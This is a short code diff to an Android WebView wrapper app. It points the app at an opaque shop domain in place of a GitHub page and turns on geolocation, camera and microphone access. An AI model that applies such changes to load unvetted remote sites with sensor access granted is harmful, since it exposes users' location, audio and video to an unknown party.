@@ -107,7 +107,7 @@ public class MainActivity extends AppCompatActivity {
     private GeolocationPermissions.Callback geoCallback;
     private String geoOrigin;
 
-    String mainURL = "https://github.com/Jipok";
+    String mainURL = "https://im8885.akfjcn.shop";
     boolean requireDoubleBackToExit = true;
     boolean allowSubdomains = true;
 
@@ -139,9 +139,9 @@ public class MainActivity extends AppCompatActivity {
     int fadeInDuration = 400;
     boolean DebugWebView = false;
 
-    boolean geolocationEnabled = false;
-    boolean cameraEnabled = false;
-    boolean microphoneEnabled = false;
+    boolean geolocationEnabled = true;
+    boolean cameraEnabled = true;
+    boolean microphoneEnabled = true;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
